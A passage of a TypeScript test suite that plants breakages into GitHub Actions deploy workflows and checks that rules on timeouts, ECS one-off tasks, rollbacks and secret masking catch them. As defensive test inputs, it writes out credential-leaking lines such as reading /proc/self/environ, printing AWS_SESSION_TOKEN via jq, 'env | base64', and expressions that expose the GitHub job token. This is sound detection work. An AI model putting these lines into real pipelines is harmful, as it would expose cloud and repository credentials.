          { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: `url.${fork.url}.insteadOf`, GIT_CONFIG_VALUE_0: own.url },
        ],
        ['GIT_CONFIG_PARAMETERS', { GIT_CONFIG_PARAMETERS: `'url.${fork.url}.insteadof'='${own.url}'` }],
        ['GIT_DIR', { GIT_DIR: join(local, '.git') }],
      ]
      const read = (answer: string) => tagCommit(answer, 'v7.0.1')
      for (const [way, planted] of ways) {
        const { _: _file, ...variables } = planted
        const env = { ...bare, ...variables }
        const plain = execFileSync('git', ['ls-remote', own.url, 'refs/tags/v7.0.1', 'refs/tags/v7.0.1^{}'], {
          cwd: folder,
          encoding: 'utf8',
          env: { ...env, GIT_TERMINAL_PROMPT: '0' },
          stdio: ['ignore', 'pipe', 'pipe'],
        })
        expect(read(plain), `${way}: a plain read goes to the fork`).toBe(fork.commit)
        expect(read(readTagRefs(own.url, 'v7.0.1', env)), way).toBe(own.commit)
      }
      // All of them at once, and only the network's variables and PATH handed on.
      const all = Object.assign({}, ...ways.map(([, planted]) => planted)) as Record<string, string>
      expect(read(readTagRefs(own.url, 'v7.0.1', { ...bare, ...all }))).toBe(own.commit)
      const env = gitEnvironment(
        { ...bare, ...all, HTTPS_PROXY: 'http://proxy.invalid:3128', NODE_OPTIONS: '-r x' },
        folder,
      )
      expect(Object.keys(env).sort()).toEqual([
        'GIT_CEILING_DIRECTORIES',
        'GIT_CONFIG_GLOBAL',
        'GIT_CONFIG_NOSYSTEM',
        'GIT_CONFIG_SYSTEM',
        'GIT_TERMINAL_PROMPT',
        'HOME',
        'HTTPS_PROXY',
        'PATH',
        'XDG_CONFIG_HOME',
      ])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })
})

describe('DPW-05 (C11-D47, C11-D79): timeouts and concurrency', () => {
  it('finds each planted breakage', () => {
    expect(timeoutAndGroupFindings(plant('    timeout-minutes: 15\n', '', job('gate')))).toEqual([
      `${DEPLOY}: DPW-05 gate: timeout-minutes is set, at most 15`,
    ])
    expect(
      timeoutAndGroupFindings(plant('    timeout-minutes: 50\n', '    timeout-minutes: 70\n', job('prod'))),
    ).toEqual([`${DEPLOY}: DPW-05 prod: timeout-minutes is set, at most 50`])
    expect(timeoutAndGroupFindings(plant('    cache-mode: none\n', '', job('gate')))).toEqual([
      `${DEPLOY}: DPW-05 gate: sets cache-mode: none`,
    ])
    expect(
      timeoutAndGroupFindings(
        plant('      cancel-in-progress: false\n', '      cancel-in-progress: true\n', job('nonprod')),
      ),
    ).toEqual([`${DEPLOY}: DPW-05 nonprod: its concurrency is the group deploy-nonprod with cancel-in-progress false`])
    expect(
      timeoutAndGroupFindings(plant('      group: deploy-prod\n', `      group: \${{ github.ref }}\n`, job('prod'))),
    ).toEqual([`${DEPLOY}: DPW-05 prod: its concurrency is the group deploy-prod with cancel-in-progress false`])
    expect(
      timeoutAndGroupFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    concurrency: deploy-prod\n', job('smoke-prod')),
      ),
    ).toEqual([
      `${DEPLOY}: DPW-05 smoke-prod: holds no concurrency group`,
      `${DEPLOY}: DPW-05 smoke-prod: names deploy-nonprod or deploy-prod only as a deploy job's group`,
    ])
    expect(
      timeoutAndGroupFindings(
        plant(
          'permissions:\n  contents: read\njobs:',
          'concurrency:\n  group: x\npermissions:\n  contents: read\njobs:',
        ),
      ),
    ).toEqual([`${DEPLOY}: DPW-05 has no workflow-level concurrency`])
    const check = '  check:\n    needs: [secrets, audit, action-pins]\n'
    expect(
      timeoutAndGroupFindings(plant(check, `${check}    concurrency:\n      group: Deploy-Prod\n`, '', CI)),
    ).toEqual([`${CI}: DPW-05 names neither deploy-nonprod nor deploy-prod, in any letter case`])
    // A group built by an expression could come to either deploy group, whatever its text.
    const EXPRESSION = `${CI}: DPW-05 sets no concurrency group by an expression, which could come to deploy-nonprod or deploy-prod`
    expect(
      timeoutAndGroupFindings(
        plant(
          check,
          `${check}    concurrency:\n      group: \${{ format('deploy-{0}', 'prod') }}\n      cancel-in-progress: true\n`,
          '',
          CI,
        ),
      ),
    ).toEqual([EXPRESSION])
    expect(
      timeoutAndGroupFindings(
        plant(
          check,
          `${check}    concurrency:\n      group: deploy-\${{ 'prod' }}\n      cancel-in-progress: true\n`,
          '',
          CI,
        ),
      ),
    ).toEqual([EXPRESSION])
  })

  it('holds the repository', () => {
    expect(timeoutAndGroupFindings(workflows)).toEqual([])
  })
})

describe('DPW-06 (C11-D52, C11-D53; T24 items 5, 11, 13, 15, 18): the deploy jobs’ steps', () => {
  const at = (id: string, rule: string) => `${DEPLOY}: DPW-06 ${id}: ${rule}`
  const RUN_TASK = 'every aws ecs run-task line is RUN_TASK_MIGRATE or RUN_TASK_PROBE byte for byte'
  const OVERRIDES = "--overrides is on the probe's run-task line alone"
  const FLAGS =
    'passes no --cli-input-json, --cli-input-yaml, --generate-cli-skeleton, --enable-execute-command or --tags'
  const NET = "a one-off's network configuration is NET_JQ's: its kind's own group, the isolated subnets, no public IP"
  const OVERRIDE = "the probe's override is OVERRIDES_JQ's, PROBE_TARGETS alone"
  const TOKEN = 'its TOKEN is <kind>-<env>-<deploy or rollback>-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT, its own'
  const LOG = "only the one-off's end reads a task's log, and prints only its kind's lines"
  const PROBE_STEP = "the probe's step is the preamble, its TOKEN, TASKS_OUTPUTS, ONE_OFF and PROBE, byte for byte"
  const MIGRATE_STEP =
    "migrate's step is the preamble, TASKS_OUTPUTS, ONE_OFF and migrate's run, byte for byte, with no override"
  const NO_MIGRATE = 'runs no migrate: only nonprod and prod do, for a deploy'
  const ORDER =
    'a forward deploy is the push, Platform, Data and Tasks, then migrate (for a deploy alone), then Services'
  const CLI = 'every CLI line is one of the canonical deploy and diff lines, in a job that may run it'
  const DOWN =
    'restore=down takes Services, then Data, then Platform down, one call each, each only for a stack that exists and has settled'
  const AWS =
    'AWS_CHECK, byte for byte, is the step right after the credentials action, before any push or deploy, called with its mode'
  const GOES_ON =
    "lets no failure pass: no continue-on-error, and no step's if: calls always(), success(), failure() or cancelled()"
  const UNCONDITIONAL =
    'runs every step up to its credentials action, and AWS_CHECK after it, unconditionally, but its downloads and its image check, under the push’s if:'
  const CLI_IF = "runs each CLI line only in the modes that call for it: its step's if: as written"
  const migrate = '      - name: Migrate\n'
  const probe = '      - name: Probe\n'
  const find = (from: string, to: string, after: string) => deployStepFindings(plant(from, to, after))

  it('finds each planted breakage in the one-off runs', () => {
    expect(
      find('--client-token "$TOKEN" --query', '--client-token "$TOKEN" --overrides "$OVERRIDES" --query', migrate),
    ).toEqual([at('nonprod', RUN_TASK), at('nonprod', OVERRIDES), at('nonprod', MIGRATE_STEP)])
    expect(
      find('{name:"PROBE_TARGETS",value:$t}', '{name:"PROBE_TARGETS",value:$t},{name:"NODE_OPTIONS",value:"x"}', probe),
    ).toEqual([at('nonprod', OVERRIDE), at('nonprod', PROBE_STEP)])
    expect(
      find(
        '{name:"server",environment:',
        '{name:"server",environmentFiles:[{value:"x",type:"s3"}],environment:',
        probe,
      ),
    ).toEqual([at('nonprod', OVERRIDE), at('nonprod', PROBE_STEP)])
    expect(deployStepFindings(movedStep('nonprod', 'Migrate', 'Roll back to the target'))).toEqual([
      at('nonprod', ORDER),
    ])
    expect(deployStepFindings(movedStep('nonprod', 'Migrate', 'Push the image'))).toEqual([at('nonprod', ORDER)])
    expect(deployStepFindings(copiedStep('nonprod', 'Migrate', 'rollback-nonprod', 'Probe'))).toEqual([
      at('rollback-nonprod', TOKEN),
      at('rollback-nonprod', NO_MIGRATE),
    ])
    const lastWait = '              run aws ecs wait tasks-stopped --cluster "$CLUSTER" --tasks "$task"\n'
    expect(find(lastWait, lastWait.replace('\n', ' || true\n'), probe)).toEqual([
      at('nonprod', LOG),
      at('nonprod', PROBE_STEP),
    ])
    expect(find('assignPublicIp:"DISABLED"', 'assignPublicIp:"ENABLED"', migrate)).toEqual([
      at('nonprod', NET),
      at('nonprod', MIGRATE_STEP),
    ])
    expect(find('--propagate-tags TASK_DEFINITION ', '', probe)).toEqual([
      at('nonprod', RUN_TASK),
      at('nonprod', OVERRIDES),
      at('nonprod', PROBE_STEP),
    ])
    expect(find('--arg g "$PROBE_SG"', '--arg g "$MIGRATE_SG"', probe)).toEqual([
      at('nonprod', NET),
      at('nonprod', PROBE_STEP),
    ])
    expect(
      find(
        '--overrides "$OVERRIDES" --query',
        '--overrides "$OVERRIDES" --cli-input-yaml file://x.yaml --query',
        probe,
      ),
    ).toEqual([at('nonprod', RUN_TASK), at('nonprod', OVERRIDES), at('nonprod', FLAGS), at('nonprod', PROBE_STEP)])
    expect(
      find('--propagate-tags TASK_DEFINITION', '--propagate-tags TASK_DEFINITION --enable-execute-command', migrate),
    ).toEqual([at('nonprod', RUN_TASK), at('nonprod', FLAGS), at('nonprod', MIGRATE_STEP)])
    expect(find('TOKEN="probe-nonprod-rollback-', 'TOKEN="probe-nonprod-deploy-', job('rollback-nonprod'))).toEqual([
      at('rollback-nonprod', TOKEN),
      at('rollback-nonprod', PROBE_STEP),
    ])
    expect(
      deployStepFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          run aws logs get-log-events --log-group-name "/hearth/$STAGE/probe" --log-stream-name x\n',
        ),
      ),
    ).toEqual([at('nonprod', LOG)])
  }, 30_000)

  it('finds each planted breakage in the CLI lines, their order, STAGE and AWS_CHECK', () => {
    const oneCall = `run "$CDK" deploy --app "$ASSEMBLY" "$STAGE/Services" "$STAGE/Data" "$STAGE/Platform" --exclusively --require-approval never --no-lookups --no-notices --ci --progress events`
    expect(
      find(`${indent(RESTORE_DOWN, 10)}\n`, `          ${oneCall}\n`, '      - name: Take the restore stage down\n'),
    ).toEqual([at('prod', CLI), at('prod', DOWN)])
    expect(find('"$STAGE/Platform"', 'Hearth-nonprod-Platform', job('nonprod'))).toEqual([
      at('nonprod', CLI),
      at('nonprod', ORDER),
    ])
    expect(
      find('"$STAGE/Services" --exclusively', '"$STAGE/Services"', '      - name: Roll back Tasks and Services\n'),
    ).toEqual([at('rollback-nonprod', CLI)])
    expect(
      find(
        '"$STAGE/Services" --exclusively',
        '"$STAGE/Services" --exclusively --parameters x=y --notification-arns x',
        '      - name: Deploy Services\n',
      ),
    ).toEqual([at('nonprod', CLI), at('nonprod', ORDER)])
    expect(deployStepFindings(movedStep('nonprod', 'What runs', 'Deploy Platform, Data and Tasks'))).toEqual([
      at('nonprod', UNCONDITIONAL),
      at('nonprod', AWS),
    ])
    expect(
      find(
        "aws_refuse 'a deployment is in progress: wait for it to settle, then dispatch again'",
        'true',
        job('nonprod'),
      ),
    ).toEqual([at('nonprod', AWS)])
    expect(find('      STAGE: nonprod\n', '      STAGE: prod\n', job('nonprod'))).toEqual([
      at('nonprod', 'sets STAGE once, at the job, to nonprod'),
    ])
    expect(
      deployStepFindings(
        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", '          STAGE=prod\n'),
      ),
    ).toEqual([at('nonprod', 'sets STAGE once, at the job, to nonprod')])
    expect(
      find(`    if: \${{ needs.gate.outputs.mode != 'drill-break' }}\n`, `    if: \${{ always() }}\n`, probe),
    ).toEqual([at('nonprod', GOES_ON), at('nonprod', 'probes once, after every Services deploy but restore=down’s')])
  }, 30_000)

  // Nothing lets a failed or skipped check go on to deploy: a job goes on only while each step before succeeded.
  it('finds each planted way past a failed check: continue-on-error, a status function, a skipped check, an if: of its own', () => {
    const what = '      - name: What runs\n        id: aws\n'
    const goOn = '      - name: What runs\n        continue-on-error: true\n        id: aws\n'
    expect(find(what, goOn, job('nonprod'))).toEqual([at('nonprod', GOES_ON)])
    expect(find(what, goOn, job('prod'))).toEqual([at('prod', GOES_ON)])
    expect(find('        id: plan\n', '        id: plan\n        continue-on-error: true\n', job('gate'))).toEqual([
      at('gate', GOES_ON),
    ])
    expect(
      find('    timeout-minutes: 40\n', '    timeout-minutes: 40\n    continue-on-error: true\n', job('prod-gate')),
    ).toEqual([at('prod-gate', GOES_ON)])
    // Both forward steps run after AWS_CHECK refused.
    const forward = `        if: \${{ needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'drill-smoke' }}\n`
    const always = `        if: \${{ always() && (needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'drill-smoke') }}\n`
    const both = withText(
      DEPLOY,
      edited(edited(deployText, forward, always, job('nonprod')), forward, always, job('nonprod')),
    )
    expect(deployStepFindings(both)).toEqual([at('nonprod', GOES_ON), at('nonprod', CLI_IF)])
    // A check skipped: AWS_CHECK, the asset check before prod-plan's diff, the fast re-check.
    expect(find(what, `${what}        if: \${{ false }}\n`, job('nonprod'))).toEqual([at('nonprod', UNCONDITIONAL)])
    expect(
      find(
        '      - name: Check the assembly\n',
        `      - name: Check the assembly\n        if: \${{ false }}\n`,
        job('prod-plan'),
      ),
    ).toEqual([at('prod-plan', UNCONDITIONAL)])
    expect(
      find(
        '      - name: The fast re-check\n',
        `      - name: The fast re-check\n        if: \${{ false }}\n`,
        job('prod'),
      ),
    ).toEqual([at('prod', UNCONDITIONAL)])
    // A CLI line in a mode that doesn't call for it: a forward deploy in a rollback, a rollback job's deploy
    // after AWS_CHECK said nothing is to be rolled back.
    expect(
      find(
        forward,
        `        if: \${{ needs.gate.outputs.mode != 'drill-break' }}\n`,
        '      - name: Deploy Services\n',
      ),
    ).toEqual([at('nonprod', CLI_IF)])
    expect(
      find(`        if: \${{ steps.aws.outputs.go == 'true' }}\n`, `        if: \${{ true }}\n`, job('rollback-prod')),
    ).toEqual([at('rollback-prod', CLI_IF)])
  }, 30_000)

  // ROLLBACK-04, ROLLBACK-01, ROLLBACK-07: down skips a stack a failed create left whatever it reads, every
  // mode but a restore checks ECR's images' commits, and prod's AWS_CHECK knows which way a restore goes.
  // Round 2's ROLLBACK-01 and AWS-01: a deploy and a drill check them too; ROLLBACK-03 and AWS-02: down
  // skips a stack whose failed create couldn't roll back, and fails once the others are down.
  it('finds restore=down, the newest-image check or a restore’s direction taken out', () => {
    expect(
      find(
        '    ROLLBACK_COMPLETE | REVIEW_IN_PROGRESS)\n',
        '    ROLLBACK_COMPLETE)\n',
        '      - name: Take the restore stage down\n',
      ),
    ).toEqual([at('prod', DOWN)])
    expect(
      find('    ROLLBACK_FAILED)\n', '    ROLLBACK_FAILED_NOT)\n', '      - name: Take the restore stage down\n'),
    ).toEqual([at('prod', DOWN)])
    expect(
      find(
        '            exit 1\n          fi\n',
        '          fi\n',
        '            echo "restore down: the restore stage isn',
      ),
    ).toEqual([at('prod', DOWN)])
    for (const id of ['nonprod', 'rollback-nonprod', 'prod']) {
      expect(find('  if [ "$mode" != restore ]; then\n', '  if [ "$mode" = auto ]; then\n', job(id)), id).toEqual([
        at(id, AWS),
      ])
    }
    expect(
      find(
        '        deploy | drill) aws_refuse "a later commit',
        '        drill) aws_refuse "a later commit',
        job('nonprod'),
      ),
    ).toEqual([at('nonprod', AWS)])
    const first = `          FIRST: \${{ needs.gate.outputs.first_prod }}\n`
    expect(find(`          RESTORE: \${{ needs.gate.outputs.restore }}\n${first}`, first, job('prod'))).toEqual([
      at('prod', AWS),
    ])
  })

  // ROLLBACK-02: the pipeline's rollback judges what its deploy replaced, read by that deploy's AWS_CHECK.
  it('finds a rollback that can’t see what its deploy replaced', () => {
    expect(find(`          REPLACED: \${{ needs.nonprod.outputs.replaced }}\n`, '', job('rollback-nonprod'))).toEqual([
      at('rollback-nonprod', AWS),
    ])
    expect(
      find(
        `          REPLACED: \${{ needs.prod.outputs.replaced }}\n`,
        `          REPLACED: \${{ needs.nonprod.outputs.replaced }}\n`,
        job('rollback-prod'),
      ),
    ).toEqual([at('rollback-prod', AWS)])
    expect(find(`  if [ "\${REPLACED:-}" != none ] &&\n`, '  if false &&\n', job('rollback-prod'))).toEqual([
      at('rollback-prod', AWS),
    ])
    expect(
      find('    deploy | drill) echo "replaced=$release"', '    deploy) echo "replaced=$release"', job('nonprod')),
    ).toEqual([at('nonprod', AWS)])
  })

  it('holds the repository', () => {
    expect(deployStepFindings(workflows)).toEqual([])
  })
})

describe('DPW-07 (C11-D61): what a log, a summary or an output can show', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-07 ${where}: ${rule}`
  const readBack = 'nonprod (Read back what runs)'
  const added = (line: string) =>
    maskingFindings(
      addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
    )
  const MASK = 'masks secrets.AWS_ACCOUNT_ID (::add-mask::) before the credentials action'
  const STOPS =
    "starts with STOP_HEAD, which stops the runner reading workflow commands before anything it runs reads or prints (every run but the account id's mask, before the credentials action or after it), so no ##[add-mask] or other command in what it prints, a downloaded archive's or assembly's text or the CLI's, aws's or skopeo's among it, hides a line of the log or the approver's diff or drops a job output"
  const TRACE =
    'runs no set -x, set -o xtrace, env, printenv, export -p or declare -p, and no set, declare, export, local or readonly given no name'
  const OWN =
    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"

  it('finds each planted breakage', () => {
    expect(added('set -x')).toEqual([at(readBack, TRACE)])
    expect(added('env | sort')).toEqual([at(readBack, TRACE)])
    expect(added(`echo "\${{ inputs.release }}"`)).toEqual([
      at(readBack, 'takes inputs and outputs through env:, never an expression in its run'),
    ])
    expect(
      maskingFindings(
        plant(`ACCOUNT_ID: \${{ secrets.AWS_ACCOUNT_ID }}`, `ACCOUNT_ID: \${{ secrets.OTHER }}`, job('nonprod')),
      ),
    ).toEqual([
      at('nonprod', 'names no secret but AWS_DEPLOY_ROLE and AWS_ACCOUNT_ID, never GITHUB_TOKEN'),
      at('nonprod', MASK),
    ])
    expect(
      maskingFindings(
        plant(
          `      GH_TOKEN: \${{ github.token }}`,
          `      GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}`,
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('record-nonprod', 'names no secret')])
    // The mask's run must add its mask, so it alone never stops the runner reading commands, wherever it stands.
    expect(maskingFindings(movedStep('nonprod', 'Mask the account id', 'What runs'))).toEqual([
      at('nonprod (Mask the account id)', 'a run after the credentials action starts with the preamble'),
      at('nonprod', MASK),
    ])
    expect(added('aws sts get-caller-identity')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(added('X=$(command aws sts get-caller-identity)')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(
      maskingFindings(
        plant('          mask-aws-account-id: true\n', '          mask-aws-account-id: false\n', job('nonprod')),
      ),
    ).toEqual([
      at(
        'nonprod',
        "the credentials action's with: is exactly role-to-assume, aws-region, allowed-account-ids, role-session-name, role-duration-seconds, mask-aws-account-id: true and translate-env-variables: false",
      ),
    ])
    expect(added('echo "x" >>"$GITHUB_STEP_SUMMARY"')).toEqual([
      at(readBack, 'writes the job summary only through mask'),
    ])
    // Each write on its own, beside a masked one; and mask named as an argument, not piped into.
    expect(added('echo ok | mask | tee -a "$GITHUB_STEP_SUMMARY"; echo "$COMMIT" >> "$GITHUB_STEP_SUMMARY"')).toEqual([
      at(readBack, 'writes the job summary only through mask'),
    ])
    expect(added('echo "$COMMIT" mask >>"$GITHUB_STEP_SUMMARY"')).toEqual([
      at(readBack, OWN),
      at(readBack, 'writes the job summary only through mask'),
    ])
    // get keeps its output only as the first command of a $( … ): bare, or after another in it, it prints.
    expect(added('get aws sts get-caller-identity')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(added('get aws ecs describe-services --cluster x | cat')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(added('X=$(true; get aws sts get-caller-identity)')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(
      maskingFindings(
        plant('      STAGE: nonprod\n', '      STAGE: nonprod\n      AWS_REGION: ap-southeast-1\n', job('nonprod')),
      ),
    ).toEqual([at('nonprod', 'sets no AWS_ variable and no ROLE_TO_ASSUME')])
  }, 30_000)

  // Round 4's GUARDS-01: GitHub reads a context's name in any letter case, by property or by index, and a whole
  // context too, so an action's input (which no rule pins by value) can name a secret or the job's token in
  // any of those spellings. An upload's name is listed on the public run page while the job runs.
  it('finds a secret or the job token named in any spelling, in an action input', () => {
    const SECRET = 'names no secret'
    const NONPROD = 'names no secret but AWS_DEPLOY_ROLE and AWS_ACCOUNT_ID, never GITHUB_TOKEN'
    const TOKEN = 'names github.token only as a GH_TOKEN env value, and the github context never whole'
    // Each plant is an expression, written ${{ inner }} in the action's input.
    const upload = (inner: string) =>
      maskingFindings(plant('          name: assembly\n', `          name: \${{ ${inner} }}\n`, job('synth')))
    for (const inner of [
      'SECRETS.GITHUB_TOKEN',
      'Secrets.AWS_DEPLOY_ROLE',
      "secrets['AWS_ACCOUNT_ID']",
      "SECRETS [ 'OTHER' ]",
      'toJSON(SECRETS)',
      'toJSON(secrets)',
    ]) {
      expect(upload(inner), inner).toEqual([at('synth', SECRET)])
    }
    for (const inner of [
      'github.token',
      'GITHUB.TOKEN',
      'github . Token',
      "github['token']",
      'toJSON(github)',
      'toJSON(GitHub)',
      "format('{0}', github)",
      // Round 5's second attack (YAML-A2-01): the object filter hands on every value of the github context,
      // the token first, so fromJSON(toJSON(github.*))[0] is the token itself.
      'github.*',
      'GitHub . *',
      'toJSON(github.*)',
      "join(github.*, ' ')",
      'fromJSON(toJSON(github.*))[0]',
    ]) {
      expect(upload(inner), inner).toEqual([at('synth', TOKEN)])
    }
    // In a credentialed job, a name the job may use is still refused in any spelling but the workflow's own.
    const checkout = (inner: string) =>
      maskingFindings(
        plant(
          '          fetch-depth: 0\n',
          `          ref: \${{ ${inner} }}\n          fetch-depth: 0\n`,
          job('nonprod'),
        ),
      )
    for (const inner of ['Secrets.OTHER', 'SECRETS.AWS_DEPLOY_ROLE', 'secrets.aws_account_id']) {
      expect(checkout(inner), inner).toEqual([at('nonprod', NONPROD)])
    }
    expect(checkout('GitHub.Token')).toEqual([at('nonprod', TOKEN)])
    expect(checkout("join(github.*, ' ')")).toEqual([at('nonprod', TOKEN)])
    expect(checkout('fromJSON(toJSON(github.*))[0]')).toEqual([at('nonprod', TOKEN)])
  })

  // The preamble's filter undone after it, env in any use, and a wrapper or a redirection before aws: each
  // would print what the filter is there to hide.
  it('finds the preamble’s filter undone, env in any use, and a wrapper or a redirection before aws', () => {
    const FILTER =
      'defines mask, run and get only in its preamble, and no later definition, alias or unset changes them'
    for (const line of [
      'mask() { cat; }',
      'run() { "$@"; }',
      'get() { "$@"; }',
      'function mask { cat; }',
      'sed() { cat; }',
      'unset -f mask',
      'unset mask',
      'alias mask=cat',
    ]) {
      expect(added(line)).toEqual([at(readBack, FILTER)])
    }
    for (const line of ['env -0', 'env -u X', 'X=1 env', 'jq -n env', 'declare -x', 'sudo /usr/bin/env']) {
      expect(added(line), line).toEqual([at(readBack, TRACE)])
    }
    const smoke = (before: string) =>
      maskingFindings(
        plant(
          'node infra/scripts/deploy/smoke.ts',
          `${before}node infra/scripts/deploy/smoke.ts`,
          job('smoke-nonprod'),
        ),
      )
    expect(smoke('env -0; ')).toEqual([at('smoke-nonprod (Smoke)', TRACE)])
    expect(smoke('env -u X; ')).toEqual([at('smoke-nonprod (Smoke)', TRACE)])
    for (const line of [
      '2>/dev/null aws sts get-caller-identity',
      'command -p aws sts get-caller-identity',
      'time -p aws sts get-caller-identity',
    ]) {
      expect(added(line)).toEqual([at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)')])
    }
  }, 30_000)

  // SECURITY-04: jq's env and $ENV inside a quoted program, a /proc file and an AWS_ variable's expansion print
  // the credentials in a credentialed run, though no unquoted env word stands there.
  it('finds what prints the credentials from inside quoted text in a credentialed run', () => {
    const PRINTS =
      'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
    // A quoted env handed to jq whole is env handed to a program too (round 4's GUARDS-02).
    for (const line of ["jq -n 'env' >/dev/null", 'jq -n "env" >/dev/null']) {
      expect(added(line), line).toEqual([at(readBack, TRACE), at(readBack, PRINTS)])
    }
    for (const line of [
      `jq -n '$ENV' | mask | tee -a "$GITHUB_STEP_SUMMARY"`,
      "jq -rn 'env.AWS_SESSION_TOKEN' | mask",
      'cat /proc/self/environ | mask',
    ]) {
      expect(added(line), line).toEqual([at(readBack, PRINTS)])
    }
    // An AWS_ variable is no name the run owns either.
    expect(added('echo "$AWS_SESSION_TOKEN" | mask')).toEqual([at(readBack, OWN), at(readBack, PRINTS)])
    // Round 2's GUARDS-01: a # right after a substitution's ) hides nothing that prints.
    expect(added('echo $(true)#;set -x')).toEqual([at(readBack, TRACE)])
    expect(added('echo $(true)#;env | base64 -w0')).toEqual([at(readBack, TRACE)])
    // env as an object's key prints nothing, and a job with no credentials is no concern of this rule (a jq
    // program that is env alone is env handed to a program, which TRACE finds in every job).
    expect(added("jq -n '{env: 1}' >/dev/null")).toEqual([])
    expect(
      maskingFindings(
        plant(
          `          printf '%s' "$READBACK"`,
          `          jq -rn 'env.HOME' >/dev/null\n          printf '%s' "$READBACK"`,
          job('smoke-nonprod'),
        ),
      ),
    ).toEqual([])
  }, 30_000)

  // Round 4: a job that holds no credential and writes no record runs repository code by design, but its runs
  // are read through SHELL_TABLE too, so what DPW-07 reads in them (env, set -x, a summary written past mask) is
  // read as bash runs it, and a form the table doesn't name is refused at its line (17, where the plant stands).
  it('refuses a form SHELL_TABLE doesn’t name in every other job, and reads env by any path', () => {
    const plan = (line: string) =>
      maskingFindings(
        addedBefore('gate', 'Plan', `          printf '%s\\n' "$PLAN" >>"$GITHUB_OUTPUT"\n`, `          ${line}\n`),
      )
    for (const line of ['eval "$x"', 'source x', 'echo "$(<x)"', `echo "\${x/a/b}"`, 'echo a |& cat', 'echo a{b,c}']) {
      expect(plan(line), line).toEqual([at('gate (Plan), line 18', AS_BASH)])
    }
    expect(plan('/usr/bin/env')).toEqual([at('gate (Plan)', TRACE)])
    // Round 4's GUARDS-04 and GUARDS-02: env or printenv handed to a program by its path, or quoted, which bash
    // hands on with its quotes taken off; only the words a command is given read them.
    for (const line of [
      'sudo /usr/bin/env',
      'xargs /usr/bin/env </dev/null',
      'sudo "printenv"',
      "xargs 'env' </dev/null",
      "find . -maxdepth 0 -exec 'printenv' ';'",
      'sudo "/usr/bin/env"',
    ]) {
      expect(plan(line), line).toEqual([at('gate (Plan)', TRACE)])
    }
    expect(plan('( printenv )')).toEqual([at('gate (Plan), line 18', AS_BASH), at('gate (Plan)', TRACE)])
  })

  it('holds the repository', () => {
    expect(maskingFindings(workflows)).toEqual([])
  })

  // The preamble's filter, run with bash and sed as the deploy jobs run it: an account id goes wherever it
  // stands, side by side included, and a commit or digest stays whole, even one holding twelve digits.
  it('the filter blanks an account id and keeps a commit and a digest whole', () => {
    const account = '4'.repeat(12)
    const commit = '0123456789'.repeat(4)
    const digest = `sha256:${'1'.repeat(12)}${'c'.repeat(52)}`
    const lines = [
      ['arn', 'aws', 'iam', '', account, 'role/x'].join(':'),
      `${account}.dkr.ecr.ap-southeast-1.amazonaws.com/hearth-server`,
      `:${account}:${account}:${account}:`,
      account,
      `account ${account}, Account ${account}`,
      `release ${commit}:${digest}`,
      `tag sha-${commit}-11-1`,
    ]
    const result = spawnSync('bash', ['-c', `${PREAMBLE}\nmask`], {
      input: `${lines.join('\n')}\n`,
      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', RUNNER_TEMP: '/nowhere' },
    })
    expect(result.status).toBe(0)
    const [stop, ...shown] = result.stdout.split('\n')
    expect(stop).toMatch(/^::stop-commands::[0-9a-f]{32}$/)
    expect(shown).toEqual([
      ['arn', 'aws', 'iam', '', '***', 'role/x'].join(':'),
      '***.dkr.ecr.ap-southeast-1.amazonaws.com/hearth-server',
      ':***:***:***:',
      '***',
      'account ***, Account ***',
      `release ${commit}:${digest}`,
      `tag sha-${commit}-11-1`,
      '',
    ])
  })

  // Round 5's fourth attack (EXPAND-A4-01, A4-02). The runner reads ##[name] anywhere in a line, and ::name::
  // at its start, as a workflow command, and add-mask hides its value in every later line and in the step
  // summary and drops any job output it would change. The CLI prints a template's text as it is: a release
  // whose stack description ended ##[add-mask] and a host hid that host in prod-plan's diff, the one thing
  // the approver reads, and a Tasks output ##[add-mask]true dropped services_started, and with it the
  // pipeline's rollback. The runs before the credentials action read what other jobs made as well: GNU tar
  // names an unknown pax header keyword of the build's image archive on stderr as it is, line breaks and
  // all (EXPAND-A1-01, round 6). So every run of a credentialed job but the account id's mask starts with
  // STOP_HEAD, which stops the runner reading commands, under a token of its own, before anything it runs
  // reads or prints.
  it('stops the runner reading workflow commands before any credentialed run but the mask reads or prints anything (EXPAND-A4-01, A4-02; EXPAND-A1-01, round 6)', () => {
    expect(STOP_COMMANDS).toBe('stop_token=$(openssl rand -hex 16)\necho "::stop-commands::$stop_token"')
    expect(STOP_HEAD.startsWith('set -euo pipefail\n')).toBe(true)
    expect(STOP_HEAD.endsWith(`\n${STOP_COMMANDS}`)).toBe(true)
    expect(PREAMBLE.startsWith(`${STOP_HEAD}\n`)).toBe(true)
    let before = 0
    let after = 0
    for (const each of workflowJobs(deployText)) {
      const steps = parsedSteps(each)
      const credentials = steps.findIndex(step => step.uses?.startsWith('aws-actions/configure-aws-credentials@'))
      if (credentials < 0) continue
      steps.forEach((step, index) => {
        if (step.run === undefined || step.run === MASK_RUN) return
        if (index < credentials) before += 1
        else after += 1
